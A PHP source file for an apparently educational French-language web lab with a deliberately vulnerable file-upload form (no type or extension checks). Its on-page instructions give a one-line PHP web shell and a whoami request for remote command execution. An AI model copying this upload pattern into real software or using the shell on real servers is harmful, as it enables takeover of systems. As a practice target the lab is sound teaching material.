<?php
// CSS intégré pour le rendu esthétique
$PAGE_STYLE = '
<style>
    body { font-family: "Arial", sans-serif; background-color: #f4f4f9; color: #333; margin: 20px; }
    h1 { color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
    h2, h3 { color: #34495e; }
    form { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); margin-bottom: 20px; }
    input[type="file"] { margin: 8px 0; }
    input[type="submit"] { 
        background-color: #e67e22; /* Orange pour l\'Upload */
        color: white; padding: 10px 20px; 
        border: none; border-radius: 4px; cursor: pointer; font-size: 16px;
    }
    input[type="submit"]:hover { background-color: #d35400; }
    .vulnerability-note { background-color: #e74c3c; color: white; padding: 10px; border-radius: 4px; text-align: center; margin-bottom: 15px; }
    .status { margin-top: 15px; font-weight: bold; }
    .success { color: #27ae60; }
    .error { color: #c0392b; }
</style>
';

$upload_dir = 'uploads/';
$message = "";

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["fileToUpload"])) {
    $target_file = $upload_dir . basename($_FILES["fileToUpload"]["name"]);
    
    // ⚠️ VULNÉRABILITÉ UFU ⚠️ : AUCUNE VÉRIFICATION de l\'extension, du type MIME ou du contenu du fichier.
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        $message = "<p class='status success'>SUCCESS: Le fichier ". htmlspecialchars(basename($_FILES["fileToUpload"]["name"])). " a été uploadé.</p>";
        $message .= "<p>URL du fichier : <a href='" . $target_file . "' target='_blank'>" . $target_file . "</a></p>";
    } else {
        $message = "<p class='status error'>ERROR: Problème lors de l\'upload du fichier.</p>";
    }
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>UFU Lab</title>
    <?php echo $PAGE_STYLE; ?>
</head>
<body>
    <div class="vulnerability-note">VULNÉRABILITÉ: Unrestricted File Upload (UFU) / RCE (Port 8088)</div>
    <h1>Lab UFU - Service d'Upload Vulnérable</h1>

    <p><strong>Cible:</strong> Télécharger un shell PHP (ex: <code>shell.php</code> ou <code>cmd.php</code>) pour obtenir l'exécution de commandes à distance (RCE).</p>

    <hr>

    <h2>Uploader un Fichier</h2>
    <?php echo $message; ?>
    
    <form action="index.php" method="post" enctype="multipart/form-data">
        <label for="fileToUpload">Sélectionnez le fichier à uploader :</label>
        <input type="file" name="fileToUpload" id="fileToUpload">
        <input type="submit" value="Upload File" name="submit">
    </form>
    
    <h3>Instructions pour l\'Attaque</h3>
    <p>1. Créez un fichier <code>cmd.php</code> contenant <code>&lt;?php system($_GET[\'cmd\']); ?&gt;</code></p>
    <p>2. Uploadez-le.</p>
    <p>3. Naviguez vers l\'URL du fichier uploadé (ex: <code>http://localhost:8088/uploads/cmd.php?cmd=whoami</code>).</p>
    
    <h3>Fichiers Uploadés</h3>
    <ul>
    <?php
    // Liste simple des fichiers pour faciliter le test
    $files = scandir($upload_dir);
    foreach ($files as $file) {
        if (!in_array($file, ['.', '..'])) {
            echo "<li><a href='" . $upload_dir . $file . "' target='_blank'>" . htmlspecialchars($file) . "</a></li>";
        }
    }
    ?>
    </ul>

</body>
</html>
